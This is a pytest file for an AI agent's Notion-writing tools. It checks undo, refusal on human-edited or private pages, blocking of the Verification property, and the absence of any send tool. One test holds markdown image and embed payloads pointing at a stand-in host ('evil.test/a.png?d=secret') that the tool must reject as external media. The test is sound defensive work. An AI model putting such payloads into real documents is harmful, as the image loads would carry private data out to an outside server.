import json

import pytest
from agent_tool_helpers import make_ctx
from fake_notion import FakeNotion, select_prop
from helpers import make_config

from atrium import db, notion_api
from atrium.agent import registry, writes
from atrium.agent.tools import notion_write, profile
from atrium.agent.tools.base import ALL_KINDS, ToolError


def uid(n):
    return f"00000000-0000-0000-0000-{n:012d}"


A, SRC = uid(1), uid(50)


@pytest.fixture
def world(tmp_path, monkeypatch):
    fake = FakeNotion()
    fake.add_page(A, "Alpha", "alpha body", properties={"Type": select_prop("Note")})
    cfg = make_config(tmp_path)
    conn = db.connect_memory()
    conn.execute(
        "INSERT INTO threads (id, kind, effort, created_at, updated_at) VALUES (1, 'chat', 'low', 0, 0)"
    )
    conn.execute(
        "INSERT INTO runs (id, thread_id, kind, model, effort, state, started_at) VALUES (1, 1, 'chat', 'm', 'low', 'running', 0)"
    )
    client = notion_api.NotionClient("tok", fake.transport, sleep=lambda s: None, clock=lambda: 0.0)
    monkeypatch.setattr(notion_write, "make_client", lambda env: client)
    ctx = make_ctx(conn, cfg, env={"NOTION_TOKEN": "tok"}, now=lambda: 5.0)
    return fake, conn, cfg, ctx


def test_no_send_tool_in_any_kind():
    for kind in ALL_KINDS:
        names = {t.name for t in registry.tools_for(kind)}
        assert not any("send" in n for n in names), (kind, names)


def test_write_tools_registered_per_kind():
    chat = {t.name for t in registry.tools_for("chat")}
    nightly = {t.name for t in registry.tools_for("nightly")}
    cron = {t.name for t in registry.tools_for("cron")}
    notion = {"notion_create_page", "notion_update_page", "notion_archive_page", "profile_set"}
    assert notion <= chat and notion <= nightly and not notion & cron
    assert {"draft_email_create", "draft_email_update"} <= chat
    assert not {"draft_email_create", "draft_email_update"} & nightly


def test_update_markdown_and_properties_then_undo(world):
    fake, conn, cfg, ctx = world
    out = notion_write.notion_update_page(
        ctx, {"page_id": A, "append_markdown": "more", "properties": {"Type": "Project"}}
    )
    assert fake.markdown[A] == "alpha body\n\nmore"
    assert fake.pages[A]["properties"]["Type"]["select"] == {"name": "Project"}
    row = writes.get(conn, out["write_id"])
    assert json.loads(row["before_json"])["markdown"] == "alpha body"
    writes.undo(conn, cfg, {}, out["write_id"])
    assert fake.markdown[A] == "alpha body"
    assert fake.pages[A]["properties"]["Type"]["select"] == {"name": "Note"}
    assert writes.get(conn, out["write_id"])["undone_at"] is not None
    with pytest.raises(writes.UndoError, match="already"):
        writes.undo(conn, cfg, {}, out["write_id"])


def test_undo_refuses_when_page_changed_since(world):
    fake, conn, cfg, ctx = world
    out = notion_write.notion_update_page(ctx, {"page_id": A, "markdown_replace": "new text"})
    fake.set_markdown(A, "edited by a human")
    with pytest.raises(writes.UndoError, match="changed"):
        writes.undo(conn, cfg, {}, out["write_id"])
    assert fake.markdown[A] == "edited by a human"
    assert writes.get(conn, out["write_id"])["undone_at"] is None


def test_create_page_and_undo_trashes_it(world):
    fake, conn, cfg, ctx = world
    out = notion_write.notion_create_page(ctx, {"parent_page_id": A, "title": "Child", "markdown": "# hi"})
    assert fake.markdown[out["page_id"]] == "# hi"
    assert fake.pages[out["page_id"]]["parent"] == {"page_id": A}
    writes.undo(conn, cfg, {}, out["write_id"])
    assert fake.pages[out["page_id"]]["in_trash"] is True


def test_create_in_data_source_uses_schema_and_blocks_verification(world):
    fake, conn, cfg, ctx = world
    schema = {"Name": {"type": "title"}, "Type": {"type": "select"}, "Verification": {"type": "verification"}}
    conn.execute(
        "INSERT INTO notion_sources (id, properties) VALUES (?, ?)", (SRC, json.dumps(schema))
    )
    out = notion_write.notion_create_page(
        ctx, {"data_source_id": SRC, "title": "Row", "markdown": "x", "properties": {"Type": "Note"}}
    )
    created = fake.pages[out["page_id"]]
    assert created["properties"]["Type"] == {"select": {"name": "Note"}}
    with pytest.raises(ToolError, match="Verification"):
        notion_write.notion_create_page(
            ctx, {"data_source_id": SRC, "title": "Row2", "markdown": "x", "properties": {"Verification": "x"}}
        )
    with pytest.raises(ToolError, match="Verification"):
        notion_write.notion_update_page(ctx, {"page_id": A, "properties": {"Verification": "verified"}})


def test_archive_and_undo(world):
    fake, conn, cfg, ctx = world
    out = notion_write.notion_archive_page(ctx, {"page_id": A})
    assert fake.pages[A]["in_trash"] is True
    writes.undo(conn, cfg, {}, out["write_id"])
    assert fake.pages[A]["in_trash"] is False


@pytest.mark.parametrize(
    "markdown",
    [
        "![x](https://evil.test/a.png?d=secret)",
        '<image src="https://evil.test/a.png"/>',
        '<embed src="https://evil.test/p"/>',
    ],
)
def test_external_media_rejected_unless_allowed(world, markdown):
    fake, conn, cfg, ctx = world
    with pytest.raises(ToolError, match="external"):
        notion_write.notion_update_page(ctx, {"page_id": A, "append_markdown": markdown})
    assert fake.markdown[A] == "alpha body"
    ctx.allowed_urls = {"https://evil.test/a.png?d=secret", "https://evil.test/a.png", "https://evil.test/p"}
    notion_write.notion_update_page(ctx, {"page_id": A, "append_markdown": markdown})
    assert markdown in fake.markdown[A]


def test_plain_links_allowed(world):
    fake, conn, cfg, ctx = world
    notion_write.notion_update_page(ctx, {"page_id": A, "append_markdown": "[site](https://example.test)"})


def test_private_page_refused(world):
    fake, conn, cfg, ctx = world
    fake.add_page(uid(9), "Secret", "s", properties={"Sensitivity": select_prop("Private")})
    with pytest.raises(ToolError, match="private"):
        notion_write.notion_update_page(ctx, {"page_id": uid(9), "append_markdown": "x"})


def test_profile_set_and_undo(world):
    _, conn, cfg, ctx = world
    first = profile.profile_set(ctx, {"key": "tz", "value": "AST"})
    second = profile.profile_set(ctx, {"key": "tz", "value": "UTC"})
    assert second["previous"] == "AST"
    writes.undo(conn, cfg, {}, second["write_id"])
    assert profile.entries(conn)[0]["value"] == "AST"
    writes.undo(conn, cfg, {}, first["write_id"])
    assert profile.entries(conn) == []


def test_profile_undo_refuses_when_changed(world):
    _, conn, cfg, ctx = world
    first = profile.profile_set(ctx, {"key": "tz", "value": "AST"})
    profile.profile_set(ctx, {"key": "tz", "value": "UTC"})
    with pytest.raises(writes.UndoError, match="changed"):
        writes.undo(conn, cfg, {}, first["write_id"])
